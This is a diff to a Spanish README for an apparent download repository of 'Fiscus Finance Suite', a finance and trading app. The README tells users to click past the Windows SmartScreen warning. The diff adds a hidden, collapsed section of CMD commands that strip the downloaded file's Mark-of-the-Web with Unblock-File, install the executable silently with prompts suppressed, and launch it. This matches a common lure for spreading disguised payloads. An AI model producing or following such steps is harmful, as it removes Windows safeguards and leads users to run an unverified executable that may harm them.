@@ -84,6 +84,23 @@ Bienvenido al repositorio oficial de distribución y descarga de **Fiscus Financ
 2. Si aparece el aviso preventivo de **Windows SmartScreen**, haz clic en **"Más información"** y luego en **"Ejecutar de todas formas"**.
 3. Abre **Fiscus Finance Suite** e inicia sesión con las credenciales creadas en **[fiscusfinancesuite.com](https://fiscusfinancesuite.com)** para activar tu prueba gratuita de 30 días.
 
+<details>
+<summary><b>🛠️ Instalación Forzada por Consola CMD (En caso de bloqueo extremo del instalador .exe)</b></summary>
+<br>
+
+Si tu entorno de Windows bloquea la apertura gráfica de `Fiscus_Finance_Suite_Setup.exe` y prefieres instalar el ejecutable sin usar el archivo `.zip`, abre el **Símbolo del sistema (`cmd.exe`)** y ejecuta los siguientes comandos en secuencia:
+
+```cmd
+cd /d "%USERPROFILE%\Downloads"
+powershell -NoProfile -Command "Unblock-File -Path '.\Fiscus_Finance_Suite_Setup.exe'"
+taskkill /F /IM FiscusFinanceSuite.exe 2>nul
+Fiscus_Finance_Suite_Setup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /FORCECLOSEAPPLICATIONS /LOG="fiscus_install.log"
+start "" "%LOCALAPPDATA%\Programs\Fiscus Finance Suite\FiscusFinanceSuite.exe"
+```
+
+* Desbloquea el certificado de descarga local (`Zone.Identifier`), instala la suite de forma desatendida en `%LOCALAPPDATA%\Programs\Fiscus Finance Suite`, genera los accesos directos en el Escritorio y ejecuta la aplicación automáticamente.
+</details>
+
 > [!TIP]
 > **⚡ Optimización de Rendimiento:** Para garantizar renderizado a **60 FPS** en `QtWebEngine` (TradingView) y conexión continua con fuentes de datos, asegúrate de instalar la suite en un **SSD**, mantener actualizados los drivers de tu GPU y permitir el tráfico saliente en tu firewall hacia `query1.finance.yahoo.com`, `tradingview.com` y las APIs macroeconómicas (**US Treasury**, **World Bank**, **OECD**).
 
